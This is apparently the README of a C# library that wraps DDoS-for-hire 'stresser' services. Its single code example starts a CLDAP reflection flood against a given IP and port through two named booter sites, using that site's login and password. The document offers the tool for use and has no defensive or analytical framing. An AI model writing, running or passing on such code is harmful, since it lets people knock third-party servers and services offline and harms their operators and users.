# Stressers-API

**Starting Stress:**
```C#
/* APi For only browser Edge */
StressersAPI.WebStress webStress = new StressersAPI.WebStress();
Console.WriteLine(webStress.StartStrees("IP", 80, StressersAPI.WebStress.Method.CLDAP, "Login from WebSite", "Password from WebSite"));

StressersAPI.InstantStresser instantStresser = new StressersAPI.InstantStresser();
 Console.WriteLine(instantStresser.StartStrees("IP", 80, StressersAPI.InstantStresser.Method.CLDAP, "Login from WebSite", "Password from WebSite"));
`
